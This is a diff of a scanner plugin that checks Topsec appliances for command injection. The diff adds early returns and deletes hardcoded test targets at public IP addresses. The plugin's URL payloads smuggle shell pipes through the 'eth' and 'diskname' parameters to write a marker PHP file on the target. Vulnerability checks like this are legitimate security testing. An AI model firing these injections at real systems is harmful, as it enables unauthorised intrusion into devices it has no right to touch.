@@ -24,7 +24,8 @@ def audit(arg):
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvul' in res:
         security_hole(target)
-  
+        return arg
+
     payload="acc/network/interface/check_interface_stat.php?eth=%20|%20echo%20testvul%20>%20testh.php%20|"
     target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target);
@@ -33,8 +34,9 @@ def audit(arg):
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvul' in res:
         security_hole(target)
+        return arg
 
-        
+
     payload='acc/fdisk/fdisk_action.php?action=1&diskname=1%20|%20echo%20testvul%20>%20testc.php%20|%20&setTosize=10'
     target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target)
@@ -43,12 +45,10 @@ def audit(arg):
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvul' in res:
         security_hole(target)
-        
 
 
-if __name__ == '__main__':
+
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    # audit(assign('topsec', 'http://61.54.222.33:8080/')[1])
-    audit(assign('topsec', 'http://61.148.24.182/')[1])
-    # audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
-    # audit(assign('topsec', 'http://61.54.222.39:8080/')[1])
